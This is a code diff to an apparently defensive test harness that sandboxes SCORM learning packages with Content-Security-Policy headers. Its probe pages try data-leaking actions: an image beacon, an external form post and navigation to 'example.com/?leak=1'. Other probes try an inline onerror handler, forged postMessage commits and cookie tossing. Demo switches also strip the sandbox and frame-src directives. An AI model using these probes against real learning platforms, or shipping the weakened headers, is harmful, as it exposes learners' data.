@@ -59,7 +59,8 @@ app.Use(async (ctx, next) =>
         if (port == 5101)
         {
             h["X-Frame-Options"] = "DENY";
-            h["Content-Security-Policy"] = $"frame-ancestors 'none'; frame-src {ContentOrigin}";
+            // hdr=nofs: demonstration only, the app page without frame-src (to show it is load-bearing).
+            h["Content-Security-Policy"] = ctx.Request.Query["hdr"] == "nofs" ? "frame-ancestors 'none'" : $"frame-ancestors 'none'; frame-src {ContentOrigin}";
             h["Referrer-Policy"] = "strict-origin-when-cross-origin";
         }
         else
@@ -68,7 +69,10 @@ app.Use(async (ctx, next) =>
             h["Content-Security-Policy"] =
                 "default-src 'none'; script-src 'self' 'unsafe-inline'" + (relaxed ? " 'unsafe-eval'" : string.Empty) +
                 "; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; font-src 'self' data:; " +
-                $"connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors {AppOrigin}";
+                $"connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors {AppOrigin}" +
+                // F1 (QA review): the sandbox directive gives an opaque origin even when the URL is opened as a top-level page.
+                // hdr=nosandbox: demonstration only, the header set without it.
+                (ctx.Request.Query["hdr"] == "nosandbox" ? string.Empty : "; sandbox allow-scripts");
             h["Referrer-Policy"] = "no-referrer";
             h["Cache-Control"] = "private, no-store";
             h.Remove("X-Frame-Options");
@@ -88,7 +92,12 @@ app.MapGet("/", (HttpContext ctx) =>
     }
 
     ctx.Response.Cookies.Append("lms_session", "APP-SESSION-SECRET", new CookieOptions { Path = "/", SameSite = SameSiteMode.Lax });
-    var csp = ctx.Request.Query["csp"] == "eval" ? "?csp=eval" : string.Empty;
+    var csp = (ctx.Request.Query["csp"] == "eval" ? "?csp=eval" : string.Empty);
+    if (ctx.Request.Query["hdr"].Count > 0)
+    {
+        csp += (csp.Length == 0 ? "?" : "&") + "hdr=" + ctx.Request.Query["hdr"];
+    }
+
     var token = MakeToken("pkg-1", "student-1", TimeSpan.FromMinutes(10));
     return Results.Content(PlayerPage.Html(ContentOrigin + "/p/" + token + "/index.html" + csp, token), "text/html");
 });
@@ -115,6 +124,7 @@ app.MapGet("/p/{token}/{**file}", (string token, string? file) =>
     {
         "index.html" => Results.Content(PackageFiles.Index, "text/html; charset=utf-8"),
         "shim.js" => Results.Content(PackageFiles.Shim, "text/javascript; charset=utf-8"),
+        "top.html" => Results.Content(PackageFiles.Top, "text/html; charset=utf-8"),
         "api.json" => Results.Content("{\"x\":1}", "application/json"),
         _ => Results.NotFound(),
     };
@@ -182,12 +192,23 @@ const pending = {};
 addEventListener('message', e => { if (e.source === parent && e.data && e.data.type === 'init' && e.ports[0] && !port) port = e.ports[0]; });
 window.API = {
   LMSInitialize: () => 'true', LMSFinish: () => 'true', LMSGetLastError: () => '0', LMSGetErrorString: () => '', LMSGetDiagnostic: () => '',
-  LMSGetValue: k => pending[k] ?? '',
+  LMSGetValue: k => k === 'cmi.core.student_name' || k === 'cmi.core.student_id' ? 'learner' : (pending[k] ?? ''),  // opaque: never real identity
   LMSSetValue: (k, v) => { pending[k] = String(v); return 'true'; },
   LMSCommit: () => { if (port) port.postMessage({ type: 'scorm.commit', data: { ...pending } }); return 'true'; },
 };
 window.__sendProbe = results => { if (port) port.postMessage({ type: 'probe.report', results }); };
 window.__rawPort = () => port;
+""";
+
+    /// <summary>Opened directly as a top-level page (a leaked or lured URL), not embedded: what can it do?</summary>
+    public const string Top = """
+<!doctype html><meta charset="utf-8"><title>top</title><body><pre id="r">running</pre>
+<script>
+const r = { origin: location.origin };
+try { localStorage.setItem('x', '1'); r.localStorage = 'WORKS'; } catch (e) { r.localStorage = 'blocked: ' + e.name; }
+try { document.cookie = 'tossed=1; Domain=localhost; Path=/'; r.cookie = 'set: ' + document.cookie; } catch (e) { r.cookie = 'blocked: ' + e.name; }
+document.getElementById('r').textContent = JSON.stringify(r); document.title = 'TOPDONE';
+</script>
 """;
 
     public const string Index = """
@@ -217,6 +238,9 @@ async function t(name, fn) { try { const r = await fn(); results[name] = 'ALLOWE
   await t('inline script (this page runs one)', () => 'runs');
   await t('external image beacon', () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => rej({ name: 'img blocked' }); i.src = 'http://example.com/x.png'; }));
   await t('form submit to external', () => { const f = document.createElement('form'); f.action = 'http://example.com/'; f.method = 'post'; document.body.appendChild(f); f.submit(); return 'submitted?'; });
+  await t('inline event handler (onerror)', () => new Promise((res, rej) => { const d = document.createElement('div'); d.innerHTML = '<img src="data:,x" onerror="window.__ih=1">'; document.body.appendChild(d); setTimeout(() => window.__ih ? res('ran') : rej({ name: 'did not run' }), 300); }));
+  await t('read student_name via LMSGetValue', () => API.LMSGetValue('cmi.core.student_name'));
+  await t('own frame: location.href to outside with data', () => { setTimeout(() => { location.href = 'http://example.com/?leak=1'; }, 0); return 'navigating?'; });
   // Forged window-level message to the parent: must be ignored (only the private port is trusted).
   await t('forged window.postMessage(commit) to parent', () => { parent.postMessage({ type: 'scorm.commit', data: { 'cmi.core.lesson_status': 'passed' } }, '*'); return 'sent, expect ignored'; });
   // Legit SCORM traffic through the shim, then abusive traffic over the same port.
